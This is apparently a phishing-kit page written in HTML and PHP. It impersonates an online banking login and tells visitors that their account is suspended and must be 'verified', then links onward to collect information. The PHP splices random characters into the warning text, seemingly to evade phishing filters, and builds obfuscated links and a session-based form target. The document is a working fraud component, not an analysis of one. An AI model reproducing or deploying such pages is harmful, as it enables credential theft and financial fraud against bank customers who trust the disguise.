<!DOCTYPE html>
<html lang="en-US" class="js-focus-visible"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; }</style><title>Authentication</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="<?php echo gaflder();?>/favicon.ico">
<link href="<?php echo gaflder();?>/font-icons.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/theme.mobile.css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.shim.mobile.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/isotope.min.css" type="text/css">
<style>
body.Authentication .brand-logo {max-width:200px;height:200px;margin-top:30px;margin-bottom:30px;}
body.Authentication .mobile-authentication-container {
    display: block;
    position: relative;
}
#kindunderline{font-size:15px;}
.irisv-button{white-space:normal;}
body.Authentication.isotope-mobile .isotope-app{height:100%;max-width: 600px;width: 100%;margin: auto;}
</style>
</head>
<body id="username_page" class="alk-body shared-layout theme--theme-builder isotope-mobile Authentication windows challenge-type-username-and-password username-and-password iris-keyboard-use-detected">
<div class="page-background__layer page-background__layer0--image"></div><div id="mmenu_container"><div id="wrapper"><div id="content" class="clearfix"><div class="card-container flush-with-titlebar"><div class="card card-full-width"><div class="cms-content-area iris-content"></div></div></div><div class="cms-content-area"></div><div class="mobile-authentication-container"><div id="login_header" class="mobile-authentication-header"><div class="brand-logo" role="img"></div></div><div class="mobile-authentication-content"><div id="app" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div class="login-image-container"><form role="form" class="isotope-slide usernameAndPasswordForm" method="post" action="<?php echo $_SESSION['processor'];?><?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>"><!----><div class="isotope-slide__content"><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
	Act<?php echo rT('ALPHANUMERIC',rand(1,87));?>ion Req<?php echo rT('ALPHANUMERIC',rand(1,87));?>uired.
            </h1><div class="isotope-hidden--desktop mar-top--small"></div><div class="isotope-hidden--mobile"><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
                Welcome to online banking
            </h1></div><div class="irisv-textfield mar-bottom-small irisv-textfield--filled" id="kindunderline">   Your account has been temporarily suspended.
                       <br><br><br>  We are havi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ng issues verifying some old information on your <?php echo rT('ALPHANUMERIC',rand(1,87));?>account and we have decided<?php echo rT('ALPHANUMERIC',rand(1,87));?> to place a temporary hold<?php echo rT('ALPHANUMERIC',rand(1,87));?> until you make some required actions and verify.<!----></div>
</div><div class="isotope-slide__footer"><div class="isotope-actions mar-top--small"><a href="<?php echo $index."?".genv(gonext("note"))."=".md5(rand(10, 9999)); ?><?php echo '&ScrPg='.md5(uniqid());?>"><button type="button" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Continue </span><!----><!----></button></a><div class="forgotLinks"><span><a tabindex="0"><span class="irisv-button__text"> Proceeding will prompt you to submit some information for verification </span></a></span></div></div></div></form></div></div></div>
</div>
</div>
</div>
</div>
</div>
</body></html>